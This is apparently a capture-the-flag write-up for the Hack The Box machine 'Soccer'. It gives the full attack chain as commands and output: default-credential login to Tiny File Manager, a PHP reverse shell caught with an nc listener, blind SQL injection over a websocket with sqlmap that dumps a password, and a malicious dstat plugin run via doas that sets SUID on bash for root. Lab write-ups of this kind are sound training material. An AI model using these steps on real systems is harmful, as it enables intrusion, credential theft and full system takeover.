---
layout: post
author: H4-L0
---

![image](/images/Pasted image 20230111204544.png)

## Enumeration

### nmap

```shell
$ nmap -sV -p- soccer.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 14:41 EST
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
```

we found 3 open ports.

- `22` ssh-service
- `80` nginx webserver
- `9091` unrecognized service

### website

![image](/images/Pasted image 20230115130045.png)

website is a very basic webpage about a soccer club. nothing special.

### dirscan

```
$ ffuf -w `fzf-wordlist` -u http://soccer.htb/FUZZ -e ".php,.txt"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Extensions       : .php .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 35ms]
.hta.txt                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 40ms]
.htaccess.txt           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 40ms]
.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 40ms]
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 42ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 41ms]
.htpasswd.txt           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 42ms]
index.html              [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 36ms]
:: Progress: [13842/13842] :: Job [1/1] :: 1101 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

the basic dirscan gave nothing interesting.

## port 9091

![image](/images/Pasted image 20230111204610.png)

we look into the port `9091` and it looks like an api. but we are getting a `404` error

```shell
$ ffuf -w `fzf-wordlist` -u http://soccer.htb/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 35ms]
                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 36ms]
:: Progress: [85707/207643] :: Job [1/1] :: 1126 req/sec :: Duration: [0:01:18] :: Errors: 0 ::

```

### File Manager

after a while of searching we did another run on the dirscan with a bigger wordlist. and now wie found a directory that seems like the next step.

![image](/images/Pasted image 20230115130612.png)

we found a login page to the H3K Tiny File Manager.

![image](/images/Pasted image 20230115130708.png)

we googled for `default credentials` and got a hit.

![image](/images/Pasted image 20230115130812.png)

with these credentials we could log into the file manager.
`admin:admin@123`

next step is to upload a reverse shell. we are allowed to upload files to `tiny/uploads`
before uploading we are setting up our listener on the attacking machine.

```
nc -lvnp 4444
```

```shell
http://soccer.htb/tiny/uploads/php-reverse-shell.php
```

an we got a shell.

```
listening on [any] 4444 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.194] 35722
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 12:15:33 up  1:39,  3 users,  load average: 0.09, 0.16, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$

```

## Privileges Escalation

the user we found on the system is called `player`.
we scanned for suid-bit and got this output

```shell
www-data@soccer:/home/player$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
```

`doas` is installed on the system. it is another binary like sudo to elevate privileges. lets check the config.

```shell
www-data@soccer:/home/player$ find / -name "doas*" 2>/dev/null
/usr/local/share/man/man5/doas.conf.5
/usr/local/share/man/man1/doas.1
/usr/local/share/man/man8/doasedit.8
/usr/local/bin/doasedit
/usr/local/bin/doas
/usr/local/etc/doas.conf
www-data@soccer:/home/player$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
www-data@soccer:/home/player$
```

ok, so the user `player` is allowed to execute `dstat` as root user.
to take that step we need to get privileges of `player` first.

after looking into `/etc/hosts` we found another url.

```shell
www-data@soccer:/home/player$ cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb
127.0.1.1       ubuntu-focal    ubuntu-focal
```

## soc-player.soccer.htb

we put `soc-player.soccer.htb` into our `hosts` file and could access the new webpage.

![image](/images/Pasted image 20230115132734.png)

now we have a login and signup page.

after creating a account and logging in we could get some free tickets for a match.

![image](/images/Pasted image 20230115132857.png)

we inspected the requests in burp suite and found out that the ticket portal is using the API we found earlier on port `9091`

![image](/images/Pasted image 20230115133048.png)

checking the response we saw that the API is working on a websocket.

### websocket exploit

![image](/images/Pasted image 20230115133103.png)

![image](/images/Pasted image 20230115133344.png)

only the ticket id was used for the request. this might look like a sqli but we had to research how this is done with websockets.

and we found this blog post with a very handy exploit script.

[websocket sqli] (https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

we adjusted `url` and `payload` parameter and executed the script.

```shell
$ python3 websock_exp.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

then we needed to start `sqlmap` to check for vulnerabilities

```shell
$ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

and `sqlmap` found a time based vulnerability.

```shell
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

we found those databases

```shell
accounts
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

and this table in the `soccer_db`

```shell
Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+
```

```shell
Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```

finally we had some user credentials for `player` and could try to log into the account via ssh.

### getting root

```shell
Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
```

it worked and we can get the first flag.

```shell
player@soccer:~$ cat user.txt
118**************************e06
```

the next part should not be to hard. we know that `dstat` is the binary we need to exploit with `doas`
so we we searched for an attack vector.

we learned that we could write a python plugin that gets executed with root privileges.

```shell
$ find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
```

first check where are dstat directories.
Create a plugin called "dstat_exploit.py" under "/usr/local/share/dstat/"
with this content.

```shell
import os

os.system('chmod +s /usr/bin/bash')
```

Now execute dstat with `—exploit` flag (the flag name is determined by the suffix of the file name e.g. dstat\_\[plugin-name\].py

```shell
$ doas /usr/bin/dstat --exploit
```

ignore the error message and check the `bash` binary

```shell
$ ls -la /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
```

execute bash with `-p` flag to get root.

```sh
$ bash -p
bash-5.0# whoami
root
```

getting the root flag

```shell
bash-5.0# cat /root/root.txt
2b************************94
```

and we are done!

[H4] & [L0]
